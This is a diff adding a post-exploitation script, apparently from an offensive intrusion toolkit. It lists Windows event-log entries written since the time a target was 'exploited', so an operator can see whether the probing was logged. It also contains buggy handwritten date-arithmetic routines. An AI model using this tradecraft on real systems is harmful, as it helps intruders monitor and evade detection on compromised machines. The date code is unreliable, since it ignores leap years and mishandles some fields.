@@ -1,0 +1,629 @@
+#--------------------------------------------------------
+# File: eventRecord.eps
+# Note: Will miss leap years
+#
+# Queryeventlogs displays time based on local time
+# Queryeventrecord displays time based on GMT calculation without DST
+#--------------------------------------------------------
+
+int $DEFAULT_TIME_PERIOD = -10;
+int $INCREMENT_SIZE = 50;
+int $INCREMENT_NUMBER = 2;
+int $MAX_LOG_ENTRIES = 100;
+
+@echo off;
+@case-sensitive off;
+
+string $temp;
+string $commandLineOption;
+string $exploitDateTime;
+string $newExploitDate;
+bool $useNewExploitDate = false;
+int $counter = 0;
+
+#--------------------------------------------------------
+# Parse the command line options
+#--------------------------------------------------------
+while (defined($argv[$counter])) {
+	$temp = split("-", $argv[$counter]);
+	$counter += 1;
+
+	if (defined($temp[1])) {
+		$commandLineOption = $temp[1];
+
+		if (($commandLineOption == "h") || ($commandLineOption == "help") || ($commandLineOption == "?")) {
+			echo "\nUsage: script eventsummary.eps _Options_";
+			echo "  Display all the system/application/security events that have happened";
+			echo "  since you connected to the box.";
+			echo "\nOptions:";
+			echo "  [-start <MM/DD/YYYY HH24:MI:SS>]";
+			echo "     Use this date as the new connect date/time";
+			echo "  [-offset <minutes>]";
+			echo "     This this offset when calculating connect time.  Default = -10";
+			echo "  [-cutoff <#>]";
+			echo "     Don't display if more then # records.  Default = 100";
+			return true;
+		} else {
+			if (defined($argv[$counter])) {
+				if ($commandLineOption == "start") {
+					$exploitDateTime = $argv[$counter];
+					$useNewExploitDate = true;
+				} else if ($commandLineOption == "offset") {
+					$DEFAULT_TIME_PERIOD = <int>$argv[$counter];
+				} else if ($commandLineOption == "cutoff") {
+					$MAX_LOG_ENTRIES = <int>$argv[$counter];
+				}
+
+				$counter++;
+			} else {
+				echo "OPTION $temp[1] requires data (-h for help)";
+				return true;
+			}
+		}
+	}
+}
+
+if ($useNewExploitDate == false) {
+	#--------------------------------------------------------
+	# Get the local date/time that the target was exploited
+	#--------------------------------------------------------
+	@record on;
+	if (`lpgetenv -option exploitdate`) {
+		$exploitDateTime = GetCmdData("value");
+	} else {
+		$exploitDateTime = GetInput("Enter target exploit date (MM/DD/YYYY HH24:MI:SS)");
+	}
+	@record off;
+}
+
+#--------------------------------------------------------
+# Get the GMT date/time that the target was exploited
+#--------------------------------------------------------
+@record on;
+`remotelocaltime`;
+@record off;
+
+int $GMTBias = GetCmdData("remoteBias");
+string $exploitGMTDateTime = $exploitDateTime;
+DateAdd($exploitGMTDateTime, "mi", $GMTBias);
+
+#--------------------------------------------------------
+# Query the event logs since DEFAULT_TIME_PERIOD minutes before the connect
+# date/time (in GMT) just incase some of our probing was logged
+#--------------------------------------------------------
+string $queryDate = $exploitGMTDateTime;
+DateAdd($queryDate, "mi", $DEFAULT_TIME_PERIOD);
+
+echo "";
+echo "Connected to target at $exploitDateTime (using $DEFAULT_TIME_PERIOD minute buffer)";
+echo "";
+echo "Log time: $exploitGMTDateTime GMT (no DST)";
+
+#--------------------------------------------------------
+# Print out a summary of the queryeventlogs command
+#--------------------------------------------------------
+int $maxSize = strLen("Application");
+string $spacing;
+int $i;
+
+@record on;
+`log queryeventlogs`;
+@record off;
+
+string $logName = GetCmdData("qeLogName");
+string $lastModDateTime = GetCmdData("qeLastMod");
+string $tempModDateTime;
+string $tempDateTime;
+int $oldestRecord = GetCmdData("qeOldest");
+int $newestRecord = GetCmdData("qeNewest");
+int $recordCount = GetCmdData("qeRecordCount");
+int $dateCompareResult;
+bool $eventLogFlag;
+
+echo "\n  Log Name         Last Update Date/Time       StartID - EndID";
+echo "-----------      ---------------------       ---------------";
+$counter = 0;
+while ($counter < sizeof($logName)) {
+	$i = strLen($logName[$counter]);
+	$spacing = "";
+	while ($i < $maxSize) {
+		$spacing = "$spacing ";
+		$i++;
+	}
+
+	$tempDateTime = $lastModDateTime[$counter];
+	DateAdd($tempDateTime, "mi", $GMTBias);	
+	DateCompare($tempDateTime, $queryDate, $dateCompareResult);
+	if ($dateCompareResult >= 1) {
+		echo "$logName[$counter]      $spacing$tempDateTime (GMT)     $oldestRecord[$counter] - $newestRecord[$counter] ** NEW **";
+		$eventLogFlag[$counter] = true;
+	} else {
+		echo "$logName[$counter]      $spacing$tempDateTime (GMT)     $oldestRecord[$counter] - $newestRecord[$counter]";
+		$eventLogFlag[$counter] = false;
+	}
+	
+	$counter++;
+}
+
+#--------------------------------------------------------
+# Loop through the event logs and display records that 
+# are newer than connect date
+#--------------------------------------------------------
+int $record_number;
+string $event_type;
+string $time_stamp;
+int $event_id;
+string $computer;
+string $user;
+string $source;
+int $string_rec_num;
+string $strings;
+int $data_rec_num;
+string $data;
+int $newStartID;
+int $sampleSize;
+string $eventIDText;
+string $finalString;
+string $tempDate;
+int $j;
+int $multiplierCheck;
+int $counter2;
+
+$counter = 0;
+while ($counter < sizeof($logName)) {
+	if ($eventLogFlag[$counter]) {
+		# Determine how far back in the event log you have to look
+		$newStartID = $newestRecord[$counter];
+		$dateCompareResult = 99;
+		$j = 0;
+		$counter2 = 1;
+		while (($newestRecord[$counter] > $INCREMENT_SIZE) && ($dateCompareResult > 0)) {
+			$newStartID -= $INCREMENT_SIZE;
+			$j += $INCREMENT_SIZE;
+			
+			#Scale the $INCREMENT_SIZE incase there are tons of records
+			$multiplierCheck = $counter2;
+			$multiplierCheck %= $INCREMENT_NUMBER;
+			if ($multiplierCheck == 0) {
+				$INCREMENT_SIZE *= 2;
+			}
+
+			if ($newStartID >= $oldestRecord[$counter]) {
+				@record on;
+				`queryeventrecord -log $logName[$counter] -recnum $newStartID`;
+				@record off;
+
+				$time_stamp = GetCmdData("time_stamp");
+				DateCompare($time_stamp, $queryDate, $dateCompareResult);
+				$counter2++;
+			} else {
+				$dateCompareResult = 0;
+				$newStartID = $oldestRecord[$counter];
+			}
+		}
+		if ($j == 0) {
+			$newStartID = 1;
+		}
+	
+		# Ensure the script isn't going to kill/slow EP
+		if ($j > $MAX_LOG_ENTRIES) {
+			$sampleSize = $newestRecord[$counter];
+			$sampleSize -= $newStartID;
+			if (prompt "\n$sampleSize new records in the $logName[$counter] event log...query them all?") {
+				`log queryeventrecord -log $logName[$counter] -start $newStartID -end $newestRecord[$counter]`;
+				echo "\nSee log file for details...";
+			}
+		} else {
+			@echo off;
+			@record on;
+			if ($newStartID == $newestRecord[$counter]) {
+				`log queryeventrecord -log $logName[$counter] -recnum $newestRecord[$counter]`;
+			} else {
+				`log queryeventrecord -log $logName[$counter] -start $newStartID -end $newestRecord[$counter]`;
+			}
+			@record off;
+
+			$record_number = GetCmdData("record_number");
+			$event_type = GetCmdData("event_type");
+			$time_stamp = GetCmdData("time_stamp");
+			$event_id = GetCmdData("event_id");
+			$computer = GetCmdData("computer");
+			$user = GetCmdData("user");
+			$source = GetCmdData("source");			
+
+			$string_rec_num = GetCmdData("string_rec_num");
+			$strings = GetCmdData("strings");
+
+			$data_rec_num = GetCmdData("data_rec_num");
+			$data = GetCmdData("data");
+
+			$i=0;
+			while ($i < sizeof($record_number)) {
+				if ($i == 0) {
+					if ($logName[$counter] == "System") {
+						echo "\n  SYSTEM LOG";
+						$maxSize = strLen("Information");
+					} else if ($logName[$counter] == "Application") {
+						echo "\n  APPLICATION LOG";
+					} else if ($logName[$counter] == "Security") {
+						echo "\n  SECURITY LOG";
+					}
+					echo "ID          Date/Time        Event Type    EventID    Source";
+					echo "---       -------------      ----------    -------    ------";
+				}
+
+				DateCompare($time_stamp[$i], $queryDate, $dateCompareResult);
+				if ($dateCompareResult >= 1) {
+					$j = strLen($event_type[$i]);
+					$spacing = "";
+					while ($j < $maxSize) {
+						$spacing = "$spacing ";
+						$j++;
+					}
+
+					echo "$record_number[$i]  $time_stamp[$i]   $event_type[$i]    $spacing$event_id[$i]   $source[$i]";
+					if ($logName[$counter] == "System") {
+						if ($event_id[$i] == 6005) {
+							echo "       EVENT ID 6005: Logged at Boot Time noting event service was started";
+						} else if ($event_id[$i] == 6006) { 
+							echo "       EVENT ID 6006: Clean Shutdown";
+						} else if ($event_id[$i] == 6008) {
+							echo "    ** EVENT ID 6008: !! Dirty Shutdown !!";
+						} else if ($event_id[$i] == 6009) {
+							echo "       EVENT ID 6009: Logged during every boot and indicates the OS Version";
+						}
+					}
+		
+					# Print out the strings associated with the event entry if they exist
+					$finalString = "";
+					int $j=0;
+					while ($j < sizeof($string_rec_num)) {
+						if ($string_rec_num[$j] == $record_number[$i]) {
+							if (strlen($finalString) == 0) {
+								$finalString = $strings[$j];
+							} else if (($strings[$j] != "(NULL)") && ($strings[$j] != "-")) {
+								$finalString = "$finalString / $strings[$j]";
+							}
+						}
+						$j++;
+					}
+					if (strLen($finalString) > 0) {
+						echo "       STRINGS: $finalString";
+					}	
+
+					# Print out the data associated with the event entry if they exist	
+					$finalString = "";
+					$j=0;
+					while ($j < sizeof($data_rec_num)) {
+						if ($data_rec_num[$j] == $record_number[$i]) {
+							if (strlen($finalString) == 0) {
+								$finalString = $strings[$j];
+							} else {
+								$finalString = "$finalString / $data[$j]";
+							}
+						}
+						$j++;
+					}
+					if (strLen($finalString) > 0) {
+						echo "       DATA: $finalString\n";
+					}
+					echo "";
+				}
+
+				$i++;
+			}
+		}	
+		if ($counter < 2) {
+			pause;
+		}
+	} else {
+		echo "\n   **** There are no new entries in the $logName[$counter] log *****";
+	}
+
+	$counter++;
+}
+
+# Free up all the arrays
+undef($logName);
+undef($lastModDateTime);
+undef($oldestRecord);
+undef($newestRecord);
+undef($recordCount);
+undef($record_number);
+undef($event_type);
+undef($time_stamp);
+undef($event_id);
+undef($computer);
+undef($user);
+undef($source);
+
+return true;
+
+#--------------------------------------------------------
+# Converts a string date to and integer date
+# 0   1    2     3    4   5
+# MM, DD, YYYY, HH24, MI, SS
+#--------------------------------------------------------
+Sub DateStringToInteger(IN string $stringDate, REF int $intDate) {
+	string $splitDateTime;
+	string $tempDate;
+	string $tempTime;
+
+	$splitDateTime = split(" ", $stringDate);
+
+	$tempDate = split("/", $splitDateTime[0]);
+	$tempTime = split(":", $splitDateTime[1]);
+
+	$intDate[0] = <int>$tempDate[0];
+	$intDate[1] = <int>$tempDate[1];
+	$intDate[2] = <int>$tempDate[2];
+	$intDate[3] = <int>$tempTime[0];
+	$intDate[4] = <int>$tempTime[1];
+	$intDate[5] = <int>$tempTime[2];
+}
+
+#--------------------------------------------------------
+# Ensure that the various pieces of the date field all have the necessary 0's (integer date-type to string date-type)
+# 0   1    2     3    4   5
+# MM, DD, YYYY, HH24, MI, SS
+#--------------------------------------------------------
+Sub DateIntegerToString(REF string $stringDate, IN int $intDate) {
+	string $finalDateTime;
+
+	if ($intDate[0] < 10) {
+		$finalDateTime[0] = "0$intDate[0]";
+	} else {
+		$finalDateTime[0] = <string>$intDate[0];
+	}
+	if ($intDate[1] < 10) {
+		$finalDateTime[1] = "0$intDate[1]";
+	} else {
+		$finalDateTime[1] = <string>$intDate[1];
+	}
+	$finalDateTime[2] = <string>$intDate[2];
+	if ($intDate[3] < 10) {
+		$finalDateTime[3] = "0$intDate[3]";
+	} else {
+		$finalDateTime[3] = <string>$intDate[3];
+	}
+	if ($intDate[4] < 10) {
+		$finalDateTime[4] = "0$intDate[4]";
+	} else {
+		$finalDateTime[4] = <string>$intDate[4];
+	}
+	if ($intDate[5] < 10) {
+		$finalDateTime[5] = "0$intDate[5]";
+	} else {
+		$finalDateTime[5] = <string>$intDate[5];
+	}
+
+	$stringDate = "$finalDateTime[0]/$finalDateTime[1]/$finalDateTime[2] $finalDateTime[3]:$finalDateTime[4]:$finalDateTime[5]";
+}
+
+#--------------------------------------------------------
+# Compare 2 dates:
+#     0 = date1 < date2
+#     1 = date1 > date2
+#     2 = date1 = date2
+#--------------------------------------------------------
+Sub DateCompare(IN string $date1, IN string $date2, REF int $result) {
+	string $splitDateTime1;
+	String $splitDateTime2;
+	string $tempDate1;
+	string $tempDate2;
+	string $tempTime1;
+	string $tempTime2;
+	string $finalDateTime1;
+	string $finalDateTime2;
+
+	$splitDateTime1 = split(" ", $date1);
+	$splitDateTime2 = split(" ", $date2);
+
+	$tempDate1 = split("/", $splitDateTime1[0]);
+	$tempDate2 = split("/", $splitDateTime2[0]);
+	$tempTime1 = split(":", $splitDateTime1[1]);
+	$tempTime2 = split(":", $splitDateTime2[1]);
+
+	$finalDateTime1 = "$tempDate1[2]$tempDate1[0]$tempDate1[1]$tempTime1[0]$tempTime1[1]$tempTime1[2]";
+	$finalDateTime2 = "$tempDate2[2]$tempDate2[0]$tempDate2[1]$tempTime2[0]$tempTime2[1]$tempTime2[2]";
+
+	if ($finalDateTime1 < $finalDateTime2) {
+		$result = 0;
+	} else if ($finalDateTime1 > $finalDateTime2) {
+		$result = 1;
+	} else {
+		$result = 2;
+	}
+}
+
+#--------------------------------------------------------
+# Add offset to date1
+#    offsetType: hh24, mi
+#--------------------------------------------------------
+Sub DateAddDST(REF string $date, IN int $startDay, IN int $startMonth, IN int $endDay, IN int $endMonth, IN int $bias, REF bool $result) {
+	string $DSTStartDateTime;
+	string $DSTEndDateTime;
+	int $tempGMTDateTime;
+	int $tempDate;
+	int $result1;
+	int $result2;
+
+	DateStringToInteger($date, $tempGMTDateTime);
+	$tempDate[0] = $startMonth;
+	$tempDate[1] = $startDay;
+	$tempDate[2] = $tempGMTDateTime[2];
+	$tempDate[3] = 0;
+	$tempDate[4] = 0;
+	$tempDate[5] = 0;
+	DateIntegerToString($DSTStartDateTime, $tempDate);
+	$tempDate[0] = $endMonth;
+	$tempDate[1] = $endDay;
+	$tempDate[3] = 23;
+	$tempDate[4] = 59;
+	$tempDate[5] = 59;
+	DateIntegerToString($DSTEndDateTime, $tempDate);
+
+	DateCompare($date, $DSTStartDateTime, $result1);
+	DateCompare($date, $DSTEndDateTime, $result2);
+
+	if (($result1 > 0) && ($result2 == 0)) {
+		$result = true;
+		DateAdd($date, "mi", $bias);
+	} else {
+		$result = false;
+	}
+}
+
+#--------------------------------------------------------
+# Add offset to date1
+#    offsetType: hh24, mi
+#--------------------------------------------------------
+Sub DateAdd(REF string $date, IN string $offsetType, IN int $offset) {
+	string $splitDateTime;
+	string $tempDate;
+	string $tempTime;
+	int $convertDateTime;
+	int $minuteHolder;
+	int $hourHolder;
+	int $dayHolder;
+	int $monthHolder;
+	int $daysInMonth;
+	int $yearHolder;
+	bool $negativeFlag = false;
+	string $finalDateTime;
+
+	if ($offset < 0) {
+		$negativeFlag = true;
+	}
+
+	$splitDateTime = split(" ", $date);
+
+	$tempDate = split("/", $splitDateTime[0]);
+	$tempTime = split(":", $splitDateTime[1]);
+
+	$convertDateTime[0] = <int>$tempDate[0];
+	$convertDateTime[1] = <int>$tempDate[1];
+	$convertDateTime[2] = <int>$tempDate[2];
+	$convertDateTime[3] = <int>$tempTime[0];
+	$convertDateTime[4] = <int>$tempTime[1];
+	$convertDateTime[5] = <int>$tempTime[2];
+
+	if ($offsetType == "mi") {
+		$convertDateTime[4] += $offset;
+	} else if ($offsetType == "hh") {
+		$convertDateTime[3] += $offset;
+	} else if ($offsetType == "dd") {
+		$convertDateTime[1] += $offset;
+	} else if ($offsetType == "mm") {
+		$convertDateTime[0] += $offset;
+	} else if ($offsetType == "yy") {
+		$convertDateTime[2] += $offset;
+	}
+
+	# Minutes
+	$minuteHolder = $convertDateTime[4];
+	while (($minuteHolder < 0) || ($minuteHolder >= 60)) {
+		if ($negativeFlag) {
+			$minuteHolder += 60;
+			$convertDateTime[3]--;
+		} else {
+			$minuteHolder -= 60;
+			$convertDateTime[3]++;
+		}
+	}
+	$convertDateTime[4] = $minuteHolder;
+	
+	# Hours
+	$hourHolder = $convertDateTime[3];
+	while (($hourHolder < 0) || ($hourHolder >= 24)) {
+		if ($negativeFlag) {
+			$hourHolder += 24;
+			$convertDateTime[1]--;
+		} else {
+			$hourHolder -= 24;
+			$convertDateTime[1]++;
+		}
+	}
+	$convertDateTime[3] = $hourHolder;
+
+	# Days
+	if (($convertDateTime[0] == 1) || ($convertDateTime[0] == 3) || ($convertDateTime[0] == 5) ||
+	    ($convertDateTime[0] == 7) || ($convertDateTime[0] == 8) || ($convertDateTime[0] == 10) ||
+	    ($convertDateTime[0] == 12)) {
+		$daysInMonth = 31;
+	} else if ($convertDateTime[0] == 2) {
+		$daysInMonth = 28;
+	} else {
+		$daysInMonth = 30;
+	}
+
+	$dayHolder = $convertDateTime[1];
+	if ($negativeFlag) {
+		while ($dayHolder <= 0) {
+			$convertDateTime[0]--;
+
+			if ($convertDateTime[0] == 0) {
+				$convertDateTime[0] = 12;
+			}
+
+			if (($convertDateTime[0] == 1) || ($convertDateTime[0] == 3) || ($convertDateTime[0] == 5) ||
+			    ($convertDateTime[0] == 7) || ($convertDateTime[0] == 8) || ($convertDateTime[0] == 10) ||
+			    ($convertDateTime[0] == 12)) {
+				$daysInMonth = 31;
+			} else if ($convertDateTime[0] == 2) {
+				$daysInMonth = 28;
+			} else {
+				$daysInMonth = 30;
+			}
+
+			$dayHolder += $daysInMonth;
+		}
+		$convertDateTime[1] = $dayHolder;
+	} else {
+		while ($dayHolder > $daysInMonth) {
+			echo "Day: $dayHolder";
+			$dayHolder -= $daysInMonth;
+			$convertDateTime[0]++;
+
+			if ($convertDateTime[0] == 13) {
+				$convertDateTime[0] = 1;
+			}
+
+			if (($convertDateTime[0] == 1) || ($convertDateTime[0] == 3) || ($convertDateTime[0] == 5) ||
+			    ($convertDateTime[0] == 7) || ($convertDateTime[0] == 8) || ($convertDateTime[0] == 10) ||
+			    ($convertDateTime[0] == 12)) {
+				$daysInMonth = 31;
+			} else if ($convertDateTime[0] == 2) {
+				$daysInMonth = 28;
+			} else {
+				$daysInMonth = 30;
+			}
+		}
+		$convertDateTime[1] = $dayHolder;
+
+		if ($convertDateTime[1] == 0) {
+			$convertDateTime[1] = 1;
+		}
+	}
+
+	# Months
+	$monthHolder = $convertDateTime[0];
+	while (($monthHolder < 0) || ($monthHolder >= 13)) {
+		if ($negativeFlag) {
+			$monthHolder += 13;
+			$convertDateTime[2]--;
+		} else {
+			$monthHolder -= 13;
+			$convertDateTime[2]++;
+		}
+	}
+	$convertDateTime[0] = $monthHolder;
+
+	if ($convertDateTime[0] == 0) {
+		$convertDateTime[0] = 1;
+	}
+
+	
+
+	DateIntegerToString($date, $convertDateTime);
+}
